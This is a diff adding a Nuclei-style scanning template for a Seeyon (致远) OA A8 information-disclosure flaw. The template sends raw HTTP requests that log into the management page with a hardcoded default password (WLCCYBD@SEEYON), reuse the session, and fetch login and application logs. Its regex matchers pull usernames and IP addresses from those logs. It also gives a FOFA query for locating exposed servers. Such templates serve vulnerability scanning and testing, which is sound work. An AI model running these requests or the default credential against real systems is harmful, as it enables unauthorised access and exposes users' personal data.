@@ -1,0 +1,68 @@
+id: zhiyuanOA-A8-Disclosure-Of-Information
+info:
+  name: 致远OA A8 status.jsp 信息泄露漏洞
+  author: wjlin0
+  severity: low
+  description: 致远OA A8-m 存在状态监控页面信息泄露，攻击者可以从其中获取网站路径和用户名等敏感信息进一步攻击
+  metadata:
+    fofa-query: title="A8-m"
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A8%20status.jsp%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
+  tags: zhiyuan,oa,disclosure
+http:
+  - raw:
+      - |-
+        POST /seeyon/management/index.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 23
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        password=WLCCYBD@SEEYON
+      - |+
+        GET /seeyon/logs/login.log HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+      - |+
+        GET /seeyon/logs/v3x.log HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Origin: {{BaseURL}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+    stop-at-first-match: true
+    cookie-reuse: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+           - (?m)Login,.+,[a-z]+,[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3},.+,[0-9]{0,3}
+           - (?m)Logout:.+,[a-z]+,[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3},.+
+
+        condition: or
+      - type: word
+        part: body
+        words:
+           - java.io.IOException
+           - com.seeyon.v3x
+        condition: and
+# digest: 490a0046304402200bfa8711436491a19376b4f03d23e6708e26d3d4548984d85a76f311aa4ac5a5022027bcd454bf43772d15ee5aaf1de3d35341fe50cebe4b5a77b29bb3a306e01ef8:9d8cf424f0e932381bf27cf1e926b867
